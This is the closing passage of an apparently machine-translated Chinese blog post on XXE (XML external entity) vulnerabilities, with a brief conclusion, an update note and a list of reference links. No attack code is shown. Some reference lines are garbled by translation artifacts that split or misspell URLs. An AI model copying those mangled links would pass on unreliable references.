class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">TBA。</p><h1 id="124c" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">结论</h1><p id="9a44" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">XXE攻击的发生是因为XML解析器允许使用<em class="mv">外部实体</em>。XXE是一个发生在特定技术中的安全漏洞，即XML，如果你仍然不理解XXE，这是由于缺乏对XML本身的了解。‌</p><h1 id="ebd5" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">更新</h1><p id="94e3" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">本文将继续更新，因为关于这个XXE仍有许多内容需要讨论，尤其是来自各种编程语言的XML解析器的奇怪行为。‌</p><h1 id="2cab" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">参考:‌</h1><ul class=""><li id="bb99" class="mg mh iq kn b ko kp ks kt kw np la nq le nr li ns mm mn mo bi translated"><a class="ae mu" href="https://www.w3schools.com/xml/xml_dtd_intro.asp" rel="noopener ugc nofollow" target="_blank">https://www.w3schools.com/xml/xml_dtd_intro.asp</a></li><li id="04c1" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ns mm mn mo bi translated"><a class="ae mu" href="https://xmlwriter.net/xml_guide/entity_declaration.shtml" rel="noopener ugc nofollow" target="_blank">https://xmlwriter.net/xml_guide/entity_declaration.shtml</a></li><li id="c886" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ns mm mn mo bi translated"><a class="ae mu" href="https://gist.github.com/staaldraad/01415b990939494879b4" rel="noopener ugc nofollow" target="_blank">https://gist.github.com/staaldraad/01415b990939494879b4</a></li><li id="2075" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ns mm mn mo bi translated"><a class="ae mu" href="https://www.xml.com/pub/a/98/08/xmlqna2.html" rel="noopener ugc nofollow" target="_blank">https://www.xml.com/pub/a/98/08/xmlqna2.html</a>T11】https://www . liquid</li><li id="7e5a" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ns mm mn mo bi translated"><a class="ae mu" href="https://www.liquid-technologies.com/DTD/Structure/ENTITY.aspx" rel="noopener ugc nofollow" target="_blank">technologies.com/DTD/Structure/ENTITY.aspx</a></li><li id="7f2a" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ns mm mn mo bi translated"><a class="ae mu" href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/" rel="noopener ugc nofollow" target="_blank">https://www . acune tix . com/blog/articles/band-XML-external-entity-oo b-xxe/</a></li><li id="6825" class="mg mh iq kn b ko mp ks mq kw mr la ms le mt li ns mm mn mo bi translated"><a class="ae mu" href="https://gardienvirtuel.ca/fr/actualites/from-xml-to-rce.php" rel="noopener ugc nofollow" target="_blank">https://gardienvirtuel.ca/fr/actualites/from-xml-to-rce.php</a></li></ul></div></div>    
</body>
</html>